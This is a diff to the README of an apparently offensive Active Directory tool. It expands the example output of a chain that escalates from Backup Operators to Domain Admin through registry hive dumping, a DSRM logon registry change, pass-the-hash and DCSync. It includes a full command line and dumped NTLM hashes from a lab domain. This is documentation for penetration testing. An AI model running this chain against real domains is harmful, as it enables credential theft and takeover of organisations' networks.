@@ -92,31 +92,93 @@ backupoperatorsdump -t <DC_IP> -u <user> -p '<pass>' -d <domain> --no-cleanup
 
 ## Example Output
 
-```
-Phase 1: Registry Hive Extraction (SAM + SYSTEM)
+```bash
+$ backupoperatorsdump -t 192.168.1.200 -u svc_ldapadsecure -p 'BackupOps2026!' -d hogwarts.local
+
+╔═══════════════════════════════════════════════════════════╗
+║              BackupOperatorsDump  v3.0                    ║
+║  Full chain: Backup Operators → DSRM → PtH → DCSync     ║
+╚═══════════════════════════════════════════════════════════╝
+
+
+  ───────────────────────────────────────────────────────
+    Phase 1: Registry Hive Extraction (SAM + SYSTEM)
+  ───────────────────────────────────────────────────────
+
+  [*] Connecting to 192.168.1.200...
+  [+] Authenticated as hogwarts.local\svc_ldapadsecure
+  [*] DC hostname: DC01
+  [+] HKLM\SYSTEM → ./SYSTEM.hiv (18,083,840 bytes)
+  [+] HKLM\SAM → ./SAM.hiv (28,672 bytes)
   [+] DSRM Administrator hash: 3b9d5f8125d916785ea7346e32f3c158
   [!] This is the DSRM password, NOT the domain Administrator
 
-Phase 2: DSRM Unlock (SeRestorePrivilege → REG_OPTION_BACKUP_RESTORE)
+  ───────────────────────────────────────────────────────
+    Phase 2: DSRM Unlock (SeRestorePrivilege → REG_OPTION_BACKUP_RESTORE)
+  ───────────────────────────────────────────────────────
+
+  [*] Opening HKLM\..\Lsa with BACKUP_RESTORE write intent...
   [+] DACL bypass successful (SeRestorePrivilege)
+  [*] DsrmAdminLogonBehavior does not exist (will create)
   [+] DsrmAdminLogonBehavior = 2 → DSRM network logon ENABLED
+  [*] Waiting 3s for LSA policy refresh...
 
-Phase 3: DSRM Pass-the-Hash (domain=DC01)
+  ───────────────────────────────────────────────────────
+    Phase 3: DSRM Pass-the-Hash (domain=DC01)
+  ───────────────────────────────────────────────────────
+
+  [*] Authenticating as DC01\Administrator with DSRM hash...
   [+] LOCAL ADMIN via DSRM PtH!
-  [+] HKLM\SECURITY → SECURITY.hiv
+  [+] HKLM\SECURITY → ./SECURITY.hiv (32,768 bytes)
 
-Phase 4: Cleanup (restore DsrmAdminLogonBehavior)
-  [+] DsrmAdminLogonBehavior DELETED
+  ───────────────────────────────────────────────────────
+    Phase 4: Cleanup (restore DsrmAdminLogonBehavior)
+  ───────────────────────────────────────────────────────
 
-Phase 5: Extract $MACHINE.ACC from SECURITY hive
+  [*] Connecting to 192.168.1.200...
+  [+] Authenticated as hogwarts.local\svc_ldapadsecure
+  [+] DsrmAdminLogonBehavior DELETED (didn't exist before)
+
+  ───────────────────────────────────────────────────────
+    Phase 5: Extract $MACHINE.ACC from SECURITY hive
+  ───────────────────────────────────────────────────────
+
   [+] $MACHINE.ACC (DC01$) NT hash: 55f0450a567294cdd7024cf36582d07b
+  [+] DC machine account has DCSync rights by default!
 
-Phase 6: DCSync via $MACHINE.ACC
-  Administrator:500:...:1d7c113c207344eaf0eca5cca64e5fff:::
-  krbtgt:502:...:87ed2ddea933817687dfdb170b62da86:::
-  ... 20 domain hashes ...
+  ───────────────────────────────────────────────────────
+    Phase 6: DCSync via $MACHINE.ACC
+  ───────────────────────────────────────────────────────
 
-  CHAIN COMPLETE: Backup Operators → Domain Admin
+  [*] impacket-secretsdump → ./dcsync_full.txt
+  Administrator:500:aad3b435b51404eeaad3b435b51404ee:1d7c113c207344eaf0eca5cca64e5fff:::
+  Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+  krbtgt:502:aad3b435b51404eeaad3b435b51404ee:87ed2ddea933817687dfdb170b62da86:::
+  hogwarts.local\svc_join_domain:1103:aad3b435b51404eeaad3b435b51404ee:3b9d5f8125d916785ea7346e32f3c158:::
+  hogwarts.local\harry.potter:1105:aad3b435b51404eeaad3b435b51404ee:433660bcc2058776b1872c82b2c4d2cc:::
+  hogwarts.local\ceradm:1114:aad3b435b51404eeaad3b435b51404ee:b89803c272f63e0b0ff3aabeb8a8365d:::
+  hogwarts.local\albus.dumbledore:1115:aad3b435b51404eeaad3b435b51404ee:3a9e27a0788a68674f4d8e467314e936:::
+  hogwarts.local\severus.snape:1117:aad3b435b51404eeaad3b435b51404ee:7a43ddce5ca6320046ab081487dcd5dd:::
+  hogwarts.local\draco.malfoy:1125:aad3b435b51404eeaad3b435b51404ee:8e4c476f9351274644c3a15b37e67694:::
+  hogwarts.local\sirona.ryan:1130:aad3b435b51404eeaad3b435b51404ee:21cfe2b16ac9498e8ef70312c00ffc7f:::
+  ... +10 more
+
+  [+] DCSync COMPLETE: 20 domain hashes extracted
+  [+] Full output: ./dcsync_full.txt
+
+  ═══════════════════════════════════════════════════════
+    CHAIN COMPLETE: Backup Operators → Domain Admin
+  ═══════════════════════════════════════════════════════
+
+    Files:
+      ./SYSTEM.hiv
+      ./SAM.hiv
+      ./SECURITY.hiv
+      ./dcsync_full.txt
+
+    Key hashes:
+      DSRM Admin:     3b9d5f8125d916785ea7346e32f3c158
+      $MACHINE.ACC:   55f0450a567294cdd7024cf36582d07b
 ```
 
 ## Prerequisites
